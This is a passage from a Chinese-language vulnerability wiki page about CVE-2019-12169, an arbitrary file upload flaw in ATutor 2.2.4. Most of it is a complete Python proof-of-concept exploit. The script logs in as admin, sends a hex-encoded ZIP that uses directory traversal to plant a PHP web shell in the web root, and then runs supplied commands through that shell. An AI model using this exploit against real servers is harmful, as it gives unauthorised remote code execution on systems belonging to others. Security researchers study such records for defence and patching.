<p>位于<code>mods/_standard/patcher/index_admin.php</code>文件的补丁导入功能</p>
<p><img alt="14.png" src="../resource/%28CVE-2019-12169%29ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId37.png" /></p>
<p>这些功能无一例外的存在着相似的漏洞</p>
<h3 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h3>
<blockquote>
<p>CVE-2019-12169.py</p>
</blockquote>
<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
<span class="c1">#</span>
<span class="c1"># Exploit Title: ATutor 2.2.4 &#39;language_import&#39; Arbitrary File Upload / RCE [CVE-2019-12169]</span>
<span class="c1"># Date: 5/24/19</span>
<span class="c1"># Exploit Author: liquidsky (JMcPeters)</span>
<span class="c1"># Vendor Homepage: https://atutor.github.io/</span>
<span class="c1"># Software Link: https://sourceforge.net/projects/atutor/files/latest/download</span>
<span class="c1"># Version: 2.2.4</span>
<span class="c1"># Tested on: Windows 8 / Apache / MySQL (XAMPP)</span>
<span class="c1"># CVE : CVE-2019-12169</span>
<span class="c1"># Author Site: http://incidentsecurity.com/atutor-2-2-4-language_import-arbitrary-file-upload-rce/</span>
<span class="c1">#            : https://github.com/fuzzlove</span>
<span class="c1">#</span>
<span class="c1"># Description: ATutor 2.2.4 allows Arbitrary File Upload and Directory Traversal</span>
<span class="c1"># resulting in remote code execution via a &quot;..&quot; pathname in a ZIP archive to the mods/_core/languages/language_import.php (aka Import New Language) or mods/_standard/patcher/index_admin.php (aka Patcher) component.</span>
<span class="c1">#</span>
<span class="c1"># Greetz: wetw0rk, offsec ^^</span>
<span class="c1">#</span>
<span class="c1"># Notes: This application is no longer being maintained so there is no fix for this issue.</span>

<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span><span class="o">,</span><span class="w"> </span><span class="nn">hashlib</span><span class="o">,</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">urllib</span>
<span class="n">requests</span><span class="o">.</span><span class="n">packages</span><span class="o">.</span><span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">packages</span><span class="o">.</span><span class="n">urllib3</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>


<span class="nb">print</span> <span class="s2">&quot;+-------------------------------------------------------------+&quot;</span>
<span class="nb">print</span>
<span class="nb">print</span> <span class="s2">&quot;- ATutor 2.2.4 Arbitrary File Upload / RCE [CVE-2019-12169]&quot;</span>
<span class="nb">print</span>
<span class="nb">print</span> <span class="s2">&quot;-          Discovery / PoC by liquidsky (JMcPeters) ^^&quot;</span>
<span class="nb">print</span>
<span class="nb">print</span> <span class="s2">&quot;+-------------------------------------------------------------+&quot;</span>

<span class="k">try</span><span class="p">:</span>
<span class="c1">#settings</span>
    <span class="n">target</span>   <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
    <span class="n">password</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
    <span class="n">commands</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span>

<span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>

        <span class="nb">print</span>
    <span class="nb">print</span> <span class="s2">&quot;- usage: </span><span class="si">%s</span><span class="s2"> &lt;target&gt; &lt;username&gt; &lt;password&gt; &lt;command&gt;&quot;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
    <span class="nb">print</span> <span class="s2">&quot;- Example: </span><span class="si">%s</span><span class="s2"> incidentsecurity.com admin mypassword &#39;whoami&#39;&quot;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
        <span class="nb">print</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>


<span class="c1"># headers to upload zip</span>
<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s2">&quot;Accept-Encoding&quot;</span><span class="p">:</span> <span class="s2">&quot;gzip, deflate&quot;</span><span class="p">,</span>
    <span class="s2">&quot;Referer&quot;</span><span class="p">:</span> <span class="s2">&quot;http://&quot;</span> <span class="o">+</span> <span class="n">target</span> <span class="o">+</span> <span class="s2">&quot;/ATutor/mods/_core/languages/language_import.php&quot;</span><span class="p">,</span>
    <span class="s2">&quot;Connection&quot;</span><span class="p">:</span> <span class="s2">&quot;close&quot;</span><span class="p">,</span>
    <span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;multipart/form-data; boundary=---------------------------CVE201912169&quot;</span><span class="p">,</span>
<span class="p">}</span>

<span class="c1"># Note: This was successfully tested against a windows install however it should work with linux.</span>
<span class="c1"># -----</span>
<span class="c1"># This will drop a shell on c:\xampp\htdocs\liquidsky.php and or /var/www/html/liquidsky.php</span>
<span class="c1"># using directory traversal.</span>


<span class="c1"># php file payload</span>
<span class="n">data</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x43</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x56\x45\x32\x30\x31\x39\x31\x32\x31\x36\x39\x0d\x0a\x43\x6f</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x6e\x74\x65\x6e\x74\x2d\x44\x69\x73\x70\x6f\x73\x69\x74\x69</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x6f\x6e\x3a\x20\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61\x3b\x20</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x6e\x61\x6d\x65\x3d\x22\x66\x69\x6c\x65\x22\x3b\x20\x66\x69</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x6c\x65\x6e\x61\x6d\x65\x3d\x22\x70\x6f\x63\x2e\x7a\x69\x70</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x22\x0d\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x3a\x20\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x7a</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x69\x70\x0d\x0a\x0d\x0a\x50\x4b\x03\x04\x14\x00\x00\x00\x08</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x00\xa4\x00\xb8\x4e\xbb\xb9\x35\x2d\x6a\x00\x00\x00\x6a\x00</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x00\x00\x2c\x00\x00\x00\x2e\x2e\x5c\x2e\x2e\x5c\x2e\x2e\x5c</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x2e\x2e\x5c\x2e\x2e\x5c\x2e\x2e\x2f\x78\x61\x6d\x70\x70\x5c</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x68\x74\x64\x6f\x63\x73\x5c\x6c\x69\x71\x75\x69\x64\x73\x6b</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x79\x2e\x70\x68\x70\xb3\xb1\x2f\xc8\x28\x50\x48\x2d\x4b\xcc</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\xd1\x50\xb2\xb7\x53\xd2\x4b\x4a\x2c\x4e\x35\x33\x89\x4f\x49</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x4d\xce\x4f\x49\xd5\x50\x72\x09\xcc\xf7\x02\x62\x8b\x00\x63</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\xa7\xfc\x64\x67\xa7\x9c\x48\xa3\x8c\x32\x4f\x0f\xa7\x8c\x64</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x63\x3f\x83\x44\x0f\x2f\x43\x6f\xe7\xa0\xb4\x20\x83\xb0\xd0</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\xf0\xca\x94\xe2\xc8\x70\xd3\xbc\x94\x70\xb7\xbc\xa8\xe0\x94</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x14\xef\x90\xe2\xf4\x80\x2a\x13\x3f\xe7\x74\x5b\x5b\x25\x4d</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x4d\x6b\x05\x7b\x3b\x00\x50\x4b\x03\x04\x14\x00\x00\x00\x08</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x00\xa4\x00\xb8\x4e\xbb\xb9\x35\x2d\x6a\x00\x00\x00\x6a\x00</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x00\x00\x2c\x00\x00\x00\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x76\x61\x72\x2f\x77\x77</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x77\x2f\x68\x74\x6d\x6c\x2f\x6c\x69\x71\x75\x69\x64\x73\x6b</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x79\x2e\x70\x68\x70\xb3\xb1\x2f\xc8\x28\x50\x48\x2d\x4b\xcc</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\xd1\x50\xb2\xb7\x53\xd2\x4b\x4a\x2c\x4e\x35\x33\x89\x4f\x49</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x4d\xce\x4f\x49\xd5\x50\x72\x09\xcc\xf7\x02\x62\x8b\x00\x63</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\xa7\xfc\x64\x67\xa7\x9c\x48\xa3\x8c\x32\x4f\x0f\xa7\x8c\x64</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x63\x3f\x83\x44\x0f\x2f\x43\x6f\xe7\xa0\xb4\x20\x83\xb0\xd0</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\xf0\xca\x94\xe2\xc8\x70\xd3\xbc\x94\x70\xb7\xbc\xa8\xe0\x94</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x14\xef\x90\xe2\xf4\x80\x2a\x13\x3f\xe7\x74\x5b\x5b\x25\x4d</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x4d\x6b\x05\x7b\x3b\x00\x50\x4b\x01\x02\x14\x03\x14\x00\x00</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x00\x08\x00\xa4\x00\xb8\x4e\xbb\xb9\x35\x2d\x6a\x00\x00\x00</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x6a\x00\x00\x00\x2c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x00\x80\x01\x00\x00\x00\x00\x2e\x2e\x5c\x2e\x2e\x5c\x2e\x2e</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x5c\x2e\x2e\x5c\x2e\x2e\x5c\x2e\x2e\x2f\x78\x61\x6d\x70\x70</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x5c\x68\x74\x64\x6f\x63\x73\x5c\x6c\x69\x71\x75\x69\x64\x73</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x6b\x79\x2e\x70\x68\x70\x50\x4b\x01\x02\x14\x03\x14\x00\x00</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x00\x08\x00\xa4\x00\xb8\x4e\xbb\xb9\x35\x2d\x6a\x00\x00\x00</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x6a\x00\x00\x00\x2c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x00\x80\x01\xb4\x00\x00\x00\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x76\x61\x72\x2f\x77</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x77\x77\x2f\x68\x74\x6d\x6c\x2f\x6c\x69\x71\x75\x69\x64\x73</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x6b\x79\x2e\x70\x68\x70\x50\x4b\x05\x06\x00\x00\x00\x00\x02</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x00\x02\x00\xb4\x00\x00\x00\x68\x01\x00\x00\x00\x00\x0d\x0a</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x43</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x56\x45\x32\x30\x31\x39\x31\x32\x31\x36\x39\x0d\x0a\x43\x6f</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x6e\x74\x65\x6e\x74\x2d\x44\x69\x73\x70\x6f\x73\x69\x74\x69</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x6f\x6e\x3a\x20\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61\x3b\x20</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x6e\x61\x6d\x65\x3d\x22\x73\x75\x62\x6d\x69\x74\x22\x0d\x0a</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x0d\x0a\x49\x6d\x70\x6f\x72\x74\x0d\x0a\x2d\x2d\x2d\x2d\x2d</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x43\x56\x45\x32\x30\x31</span><span class="s2">&quot;</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x39\x31\x32\x31\x36\x39\x2d\x2d\x0d\x0a</span><span class="s2">&quot;</span>


<span class="c1">#reverse shell url</span>
<span class="n">shell</span> <span class="o">=</span> <span class="s2">&quot;http://&quot;</span> <span class="o">+</span> <span class="n">target</span> <span class="o">+</span> <span class="s2">&quot;/liquidsky.php?language=&quot;</span> <span class="o">+</span> <span class="n">commands</span>

<span class="c1"># Generate Hash</span>
<span class="k">def</span><span class="w"> </span><span class="nf">gen_hash</span><span class="p">(</span><span class="n">passwd</span><span class="p">,</span> <span class="n">token</span><span class="p">):</span>
        <span class="n">m</span><span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha1</span><span class="p">()</span>
        <span class="n">m</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">passwd</span> <span class="o">+</span> <span class="n">token</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">m</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>

<span class="k">def</span><span class="w"> </span><span class="nf">we_can_get_jiggy_with_the_pass</span><span class="p">():</span>

<span class="c1"># Run pass through SHA1</span>
     <span class="n">hash_object</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha1</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
     <span class="n">hex_dig</span> <span class="o">=</span> <span class="n">hash_object</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
     <span class="nb">print</span> <span class="s2">&quot;[*] Got SHA1 for pass: &quot;</span> <span class="o">+</span> <span class="p">(</span><span class="n">hex_dig</span><span class="p">)</span>

     <span class="n">targeturl</span> <span class="o">=</span> <span class="s2">&quot;http://&quot;</span> <span class="o">+</span> <span class="n">target</span> <span class="o">+</span> <span class="s2">&quot;/ATutor/login.php&quot;</span>
     <span class="n">token</span> <span class="o">=</span> <span class="s2">&quot;abc&quot;</span>
     <span class="n">hashed</span> <span class="o">=</span> <span class="n">gen_hash</span><span class="p">(</span><span class="n">hex_dig</span><span class="p">,</span> <span class="n">token</span><span class="p">)</span>
     <span class="n">d</span> <span class="o">=</span> <span class="p">{</span>
         <span class="s2">&quot;form_password_hidden&quot;</span> <span class="p">:</span> <span class="n">hashed</span><span class="p">,</span>
         <span class="s2">&quot;form_login&quot;</span><span class="p">:</span> <span class="s2">&quot;admin&quot;</span><span class="p">,</span>
         <span class="s2">&quot;submit&quot;</span><span class="p">:</span> <span class="s2">&quot;Login&quot;</span><span class="p">,</span>
         <span class="s2">&quot;token&quot;</span> <span class="p">:</span> <span class="n">token</span>
     <span class="p">}</span>
     <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>

<span class="c1">#Logging in</span>
     <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">targeturl</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">d</span><span class="p">)</span>
     <span class="nb">print</span> <span class="s2">&quot;[+] Logging in to system as </span><span class="si">%s</span><span class="s2"> ...&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">username</span><span class="p">)</span>
     <span class="n">res</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span>

<span class="c1"># url settings, duh</span>
     <span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;http://&quot;</span> <span class="o">+</span> <span class="n">target</span> <span class="o">+</span> <span class="s2">&quot;/ATutor/mods/_core/languages/language_import.php&quot;</span>

<span class="c1"># A similar method works for the &quot;patcher&quot; function.</span>
    <span class="c1"># url = &quot;http://&quot; + target + &quot;/ATutor/mods/_standard/patcher/index_admin.php&quot;</span>

<span class="c1"># This is &quot;the&quot; request to send the zip     </span>
     <span class="n">request</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
     <span class="nb">print</span> <span class="s2">&quot;[+] Sent the zip ......&quot;</span>
     <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="c1"># Grab shell dude!</span>
     <span class="nb">print</span> <span class="s2">&quot;[!] *** Remote Code Execution ***&quot;</span>
     <span class="n">request</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">shell</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
     <span class="nb">print</span> <span class="s2">&quot;[x] http://&quot;</span> <span class="o">+</span> <span class="n">target</span> <span class="o">+</span> <span class="s2">&quot;/liquidsky.php?language=&quot;</span> <span class="o">+</span> <span class="n">commands</span>

<span class="c1"># Note be sure to clean up: c:\xampp\htdocs\liquidsky.php and or /var/www/html/liquidsky.php</span>

     <span class="k">if</span> <span class="s2">&quot;Administration&quot;</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
         <span class="k">return</span> <span class="kc">True</span>
     <span class="k">return</span> <span class="kc">False</span>

<span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
     <span class="k">if</span> <span class="n">we_can_get_jiggy_with_the_pass</span><span class="p">():</span>
         <span class="nb">print</span> <span class="s2">&quot;&quot;</span>
         <span class="nb">print</span> <span class="s2">&quot;[+] Success! we were able to login!&quot;</span>
         <span class="nb">print</span> <span class="s2">&quot;&quot;</span>
         <span class="nb">print</span> <span class="s2">&quot;  ^_~  got r00t?   - [liquidsky 2019]&quot;</span>
     <span class="k">else</span><span class="p">:</span>         <span class="nb">print</span> <span class="s2">&quot;[-] failure!&quot;</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
     <span class="n">main</span><span class="p">()</span>
</code></pre></div>

<h2 id="_4">参考链接<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
<blockquote>
<p><a href="https://kumamon.fun/ATutor-CVE-2019-12169/">https://kumamon.fun/ATutor-CVE-2019-12169/</a></p>
<p><a href="https://github.com/fuzzlove/ATutor-2.2.4-Language-Exploit">https://github.com/fuzzlove/ATutor-2.2.4-Language-Exploit</a></p>
</blockquote>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../AVCON/AVCON-%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0download.action%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../AVCON/AVCON-%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0download.action%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        AVCON-系统管理平台download.action存在任意文件读取漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../AJ-Report/CNVD-2024-15077/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../AJ-Report/CNVD-2024-15077/README.zh-cn/" class="btn btn-xs btn-link">
        AJ-Report 认证绕过与远程代码执行漏洞（CNVD-2024-15077）
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>